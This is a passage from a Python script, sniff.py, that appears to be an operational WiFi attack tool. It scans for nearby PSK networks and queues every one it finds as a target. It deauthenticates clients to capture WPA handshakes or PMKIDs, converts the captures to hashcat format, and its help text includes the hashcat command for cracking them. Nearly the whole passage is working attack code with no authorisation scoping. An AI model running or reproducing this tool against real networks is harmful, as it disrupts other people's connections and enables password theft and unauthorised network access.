                    print(f"[!] Broadcast deauth failed after {max_retries} attempts")
    
    # Check if user wants to stop
    if graceful_shutdown:
        print(f"[!] Stop requested, aborting")
    
    # Wait for capture - duration depends on whether we sent deauth
    if successful_bursts > 0:
        # Deauth was sent - wait for clients to reconnect and complete handshake
        print(f"[+] Deauth phase complete")
        if stations:
            print(f"[*] Waiting 25s for {len(stations)} client(s) to reconnect and complete 4-way handshake...")
            wait_time = 25
        else:
            print(f"[*] Waiting 20s for hidden clients to reconnect (if any exist)...")
            wait_time = 20
    else:
        # Deauth failed
        if stations:
            # Had clients but deauth failed - still wait for passive handshake
            print(f"[!] Deauth failed - waiting 15s for passive handshake...")
            wait_time = 15
        else:
            # No clients and deauth failed - short wait for PMKID only
            print(f"[*] Deauth failed - waiting 10s for PMKID...")
            wait_time = 10
    
    # Increased wait time for complete 4-way handshake (clients need time to fully reconnect)
    time.sleep(wait_time)
    
    # Send SIGTERM to allow graceful shutdown and buffer flush
    print(f"[*] Stopping capture (allowing buffer flush)...")
    capture_proc.terminate()
    
    # Wait for process to finish writing
    try:
        capture_proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        print(f"[!] Process didn't stop gracefully, forcing...")
        capture_proc.kill()
    
    active_processes.remove(capture_proc)
    time.sleep(1)
    
    # Check if we captured a handshake
    if os.path.exists(cap_file):
        file_size = os.path.getsize(cap_file)
        print(f"[+] Capture saved as {cap_file} ({file_size} bytes)")
        
        # Primary check: Try to convert with hcxpcapngtool - this is the most reliable method
        # If conversion succeeds and produces a hash file with content, we have a valid capture
        print(f"[*] Checking for handshake/PMKID...")
        hash_file = f"hashes/{safe_essid}_{timestamp}.hc22000"
        has_handshake = False
        convert_output = ""
        
        try:
            convert_result = subprocess.run(
                f"hcxpcapngtool -o {hash_file} {cap_file} 2>&1",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            convert_output = (convert_result.stdout or '') + (convert_result.stderr or '')
            
            # Check if hash file was created and has content
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                has_handshake = True
                hash_size = os.path.getsize(hash_file)
                print(f"[+] HANDSHAKE/PMKID CAPTURED!")
                print(f"[+] Hash file created: {hash_file} ({hash_size} bytes)")
            else:
                print(f"[!] No valid handshake/PMKID detected")
                        
        except Exception as e:
            print(f"[!] Verification error: {e}")
            has_handshake = False
        
        if has_handshake:
            new_cap_path = f"captures/{os.path.basename(cap_file)}"
            try:
                os.rename(cap_file, new_cap_path)
                print(f"[+] Moved capture to: {new_cap_path}")
                cap_file = new_cap_path
            except Exception as e:
                print(f"[!] Could not move capture file: {e}")
                # Keep original path if move fails
            
            # Clean up other capture files (csv, kismet, netxml, log)
            try:
                cleanup_patterns = [
                    f"{capture_file}-*.csv",
                    f"{capture_file}-*.kismet.csv",
                    f"{capture_file}-*.kismet.netxml",
                    f"{capture_file}-*.log.csv",
                    f"{capture_file}.airodump.log"
                ]
                for pattern in cleanup_patterns:
                    for f in subprocess.run(f"ls {pattern} 2>/dev/null || true", 
                                           shell=True, capture_output=True, text=True).stdout.split():
                        try:
                            os.remove(f)
                        except:
                            pass
            except Exception as e:
                print(f"[*] Cleanup warning: {e}")
            
            # Track this success - MUST happen regardless of above operations
            global captured_handshakes
            captured_handshakes.append({
                'essid': essid, 
                'bssid': bssid, 
                'file': cap_file,
                'hash': hash_file
            })
            print(f"[*] Handshake tracked (total: {len(captured_handshakes)})")
        else:
            print(f"[!] No valid handshake detected")
            # Show what was actually found (if we got output from verification)
            if convert_output.strip():
                for line in convert_output.split('\n'):
                    if any(keyword in line.lower() for keyword in ('handshake', 'eapol', 'read', 'warning', 'error')):
                        print(f"    {line.strip()}")
                if 'too many deauthentication' in convert_output.lower():
                    print("[!] hcxpcapngtool detected excessive deauth/disassoc traffic. Lower the SNIFF_DEAUTH_* env vars or reduce retries to avoid AP counter-measures. See https://hashcat.net/forum/thread-6361.html for context.")
            
            # Clean up failed capture files
            print(f"[*] Cleaning up failed capture files...")
            cleanup_patterns = [
                f"{capture_file}-*",
                f"{capture_file}.*"
            ]
            for pattern in cleanup_patterns:
                for f in subprocess.run(f"ls {pattern} 2>/dev/null || true", 
                                       shell=True, capture_output=True, text=True).stdout.split():
                    try:
                        os.remove(f)
                    except:
                        pass
    else:
        print(f"[!] Capture file not created")
    
    # Return updated network info (if we got fresh data)
    return updated_network_info

def stop_monitor_mode(mon_interface):
    """Stop monitor mode"""
    interface = mon_interface.replace("mon", "")
    run_command(f"airmon-ng stop {mon_interface}")
    run_command(f"systemctl start NetworkManager")

def show_help():
    """Display help message and exit"""
    help_text = """
WiFi Handshake Capture Tool

Usage: sudo python3 sniff.py [OPTIONS] [interface]

OPTIONS:
  -h, --help           Show this help message and exit
  -v                   Enable verbose mode (log most commands)
  -t                   Enable test mode (7s scan, 'Zen' SSID filter, 5 network limit)
  
  --band a             Scan 5GHz only (802.11a/n/ac) - alias: -5
  --band b             Scan 2.4GHz only (802.11b/g/n) - alias: -2
  --band abg           Scan both 2.4GHz and 5GHz (default)

EXAMPLES:
  sudo python3 sniff.py                    # Scan both bands, attack all PSK networks
  sudo python3 sniff.py -v -t              # Verbose + test mode
  sudo python3 sniff.py wlan0              # Use specific interface

FEATURES:
  - Automatic monitor mode management
  - Dual-band scanning (2.4GHz + 5GHz)
  - Station detection for targeted deauth
  - PMKID and handshake capture
  - Automatic hashcat format conversion
  - Graceful shutdown: Press CTRL+C once to stop scanning and show summary,
    press CTRL+C twice to exit immediately

OUTPUT:
  captures/            Captured .cap files
  hashes/              Converted .hc22000 hashcat files

CRACKING:
  hashcat -m 22000 hashes/network.hc22000 wordlist.txt -o cracked.txt --outfile-format=2
"""
    print(help_text)
    sys.exit(0)

def main():
    global VERBOSE, TEST_MODE, BAND
    
    # Check for command-line arguments
    specified_interface = None
    args = sys.argv[1:]
    
    # Check for help first
    if '-h' in args or '--help' in args:
        show_help()
    
    # Register signal handler for CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create output directories
    os.makedirs("captures", exist_ok=True)
    os.makedirs("hashes", exist_ok=True)
    print("[*] Output directories ready: captures/, hashes/")
    
    # Parse flags
    if '-v' in args:
        VERBOSE = True
        args.remove('-v')
        print("[*] Verbose mode enabled")
    
    if '-t' in args:
        TEST_MODE = True
        args.remove('-t')
        print("[*] Test mode enabled (7s scan, 'Zen' filter, 5 network max)")
    
    # Band selection flags
    band_set = False
    if '--band' in args:
        idx = args.index('--band')
        if idx + 1 < len(args):
            band_value = args[idx + 1]
            if band_value in ['a', 'b', 'abg']:
                BAND = band_value
                args.pop(idx)  # Remove --band
                args.pop(idx)  # Remove value
                band_desc = {"a": "5GHz only (802.11a/n/ac)", "b": "2.4GHz only (802.11b/g/n)", "abg": "Both 2.4GHz and 5GHz"}
                print(f"[*] Band: {band_desc[BAND]}")
                band_set = True
            else:
                print(f"[!] Invalid band value: {band_value}. Use 'a', 'b', or 'abg'")
                sys.exit(1)
        else:
            print("[!] --band requires a value (a, b, or abg)")
            sys.exit(1)
    
    # Short aliases for bands
    if not band_set:
        if '-5' in args:
            BAND = 'a'
            args.remove('-5')
            print("[*] Band: 5GHz only (802.11a/n/ac)")
        elif '-2' in args:
            BAND = 'b'
            args.remove('-2')
            print("[*] Band: 2.4GHz only (802.11b/g/n)")
    
    # Remaining argument is the interface
    if len(args) > 0:
        specified_interface = args[0]
    
    try:
        # Get wireless interface
        interface = get_wireless_interface(specified_interface)
        print(f"[+] Using interface: {interface}")
        
        # Start monitor mode
        mon_interface = start_monitor_mode(interface)
        print(f"[+] Monitor mode enabled: {mon_interface}")
        
        # Scan for networks - longer duration to detect clients
        scan_duration = 7 if TEST_MODE else 120
        print(f"[*] Scanning for {scan_duration}s to detect networks and clients...")
        csv_file = scan_networks(mon_interface, duration=scan_duration)
        
        if not csv_file or not os.path.exists(csv_file):
            print("[!] Failed to create scan file, exiting")
            cleanup_processes()
            return
        
        # Parse networks with PSK
        networks = parse_networks(csv_file)
        print(f"\n[+] Found {len(networks)} PSK networks")
        
        # Get all stations mapped by BSSID
        stations_by_bssid = get_all_stations_by_bssid(csv_file)
        
        # Enrich networks with station info
        for network in networks:
            bssid_upper = network['bssid'].upper()
            if bssid_upper in stations_by_bssid:
                network['stations'] = stations_by_bssid[bssid_upper]
                network['clients'] = len(stations_by_bssid[bssid_upper])
                network['has_clients'] = True
            else:
                network['stations'] = []
                network['clients'] = 0
                network['has_clients'] = False
        
        # In test mode, filter to only "Zen" networks and limit to first 5
        if TEST_MODE:
            zen_networks = [n for n in networks if 'Zen' in n['essid']]
            print(f"[*] TEST MODE: Filtered to {len(zen_networks)} networks with 'Zen' in SSID")
            networks = zen_networks[:5]
            if len(zen_networks) > 5:
                print(f"[*] TEST MODE: Limiting to first 5 networks")
        
        if not networks:
            print("[!] No networks to attack after filtering")
            cleanup_processes()
            return
        
        # Attack each network with progress tracking and periodic rescanning
        global processed_bssids
        network_queue = networks.copy()
        attack_count = 0
        rescan_interval = 5  # Rescan every 5 networks (clients are transient)
        
        while network_queue:
            # Check for graceful shutdown
            if graceful_shutdown:
                print(f"\n[!] Graceful shutdown requested - skipping remaining {len(network_queue)} network(s)")
                break
            
            # Get next network
            network = network_queue.pop(0)
            attack_count += 1
            
            # Mark as processed
            processed_bssids.add(network['bssid'])
            
            # Attack with progress indicator
            total_processed = attack_count
            capture_handshake(mon_interface, network, current=attack_count, total=total_processed + len(network_queue))
            
            # Periodic rescan every 5 networks (clients are transient)
            if attack_count % rescan_interval == 0 and not TEST_MODE:
                # Periodic rescan duration to refresh client lists
                rescan_duration = 60
                print(f"\n[*] Periodic rescan ({attack_count} networks processed, checking for new targets)...")
                rescan_csv = scan_networks(mon_interface, duration=rescan_duration)
                
                if rescan_csv and os.path.exists(rescan_csv):
                    new_networks = parse_networks(rescan_csv)
                    
                    # Add only new BSSIDs we haven't seen yet
                    added = 0
                    for net in new_networks:
                        if net['bssid'] not in processed_bssids and net not in network_queue:
                            # Check if already in queue by BSSID
                            if not any(n['bssid'] == net['bssid'] for n in network_queue):
                                network_queue.append(net)
                                added += 1
                    if added > 0:
                        print(f"[+] Added {added} new network(s) to queue")
                    else:
                        print(f"[*] No new networks found")
        
        # Print final statistics
        print("\n" + "="*60)
        print("[+] ATTACK SUMMARY")
        print("="*60)
        print(f"[*] Total networks attacked: {attack_count}")
        print(f"[*] Handshakes captured: {len(captured_handshakes)}")
        
        if captured_handshakes:
            print("\n[+] Successful captures:")
            for i, capture in enumerate(captured_handshakes, 1):
                print(f"  {i}. {capture['essid']} ({capture['bssid']})")
                print(f"     Capture: {capture['file']}")
                if capture.get('hash'):
                    print(f"     Hash: {capture['hash']}")
        else:
            print("\n[!] No handshakes captured")
        
        print("="*60)
        
        # Cleanup (this now also stops monitor mode and restarts NetworkManager)
        cleanup_processes()
        print("\n[+] Done!")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        cleanup_processes()
    except Exception as e:
        print(f"[!] Error: {e}")
        cleanup_processes()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script must be run as root")
        print("Usage: sudo python3 sniff.py [OPTIONS] [interface]")
        print("Run 'sudo python3 sniff.py -h' for detailed help")
        exit(1)
    main()